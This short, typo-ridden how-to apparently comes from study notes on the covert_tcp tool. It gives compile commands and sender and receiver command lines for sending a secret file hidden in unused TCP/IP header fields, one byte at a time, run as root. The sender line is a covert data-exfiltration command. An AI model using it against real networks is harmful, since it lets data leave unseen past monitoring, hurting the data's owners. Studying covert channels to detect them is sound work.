Covert TCP helps us to hide the data that is being sent over the network by manuplation the TCP/IP header. We send the data in the left iut spaces present in the header 1 Byte at a time.

**Link:**
		Google the covert tcp.c download
			http://www.scf.usc.edu/

**Command:**
		cc -o covert_tcp covert_tcp.c (Sender)
		cc -o covert_tcp covert_tcp.c (Receiver)
		 
		Make sure we are root.
		Main Command:
		
		Sender:
		./covert_tcp -source <sneder IP> -dest <receiver's IP> -source_port 9999 
		-dest_port 8888 -file <secret file>`
		
		Receiver:
		./covert_tcp -source <sender IP> -source_port 8888 -server -file 
		reive.txt(any name)